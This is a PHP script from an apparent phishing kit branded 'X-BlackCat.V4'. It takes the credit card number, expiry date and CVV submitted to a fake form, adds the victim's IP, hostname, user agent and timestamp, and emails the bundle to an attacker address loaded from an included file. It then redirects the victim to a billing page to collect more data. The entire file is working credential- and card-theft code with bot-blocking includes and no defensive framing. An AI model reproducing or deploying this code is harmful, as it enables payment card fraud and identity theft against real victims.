<?php
include "./block-ip/bots.php";  
include "./block-ip/opciones.php";
date_default_timezone_set('UTC');
	$Anon = rand(99999999, 999999999999999999999);
	$Isma = md5(date('l jS \of F Y h:i:s A'));
	$x = "_";
	$z = "=";
	$ip          = $_SERVER['REMOTE_ADDR'];
	$details     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip."");
	$negara      = $details->geoplugin_countryCode;
	$nama_negara = $details->geoplugin_countryName;
	$kode_negara = strtolower($negara);
session_start();
date_default_timezone_set("Africa/Morocco");
$ip = getenv("REMOTE_ADDR");
$url = "https://binlist.net/json/".$_POST['CARDNUM']."";
$Country = $_POST['Country']; 

{
{

$_SESSION['Done'] = 2;
$hostname = gethostbyaddr($ip);
$userag = $_SERVER['HTTP_USER_AGENT']; 
$date = date('d-m-Y', time());
$time = date('H:i:s', time());
$Contry = $_POST['contry'];
$message .= "===========|+|Card INFOS|+|===========\n";
$message .= "CCnumber: ".$_POST['number']."\n";
$message .= "EXP Date: ".$_POST['expiryMonth']."/".$_POST['expiryYear']."\n";
$message .= "CVV: ".$_POST['cvc']."\n";
$message .= "===========|+|INFOS PC & IP|+|===========\n";
$message .= "TIME = ".$time."\n";
$message .= "DATE = ".$date."\n";
$message .= "USER = ".$userag."\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip\n";
$message .= "===========|+|Xblack Cat|+|===========\n";

include '__MonEmail.php';
$subject = "CVC    [$ip] ^_^ Yaaaa kwiiii   ";
$headers = "From: X-BlackCat.V4";


mail($to, $subject, $message,$headers);
}

header("Location:billing.php?SessionID-xb=$negara.$z.$Anon.$x.$Isma.$z.$nama_negara");
}
?>
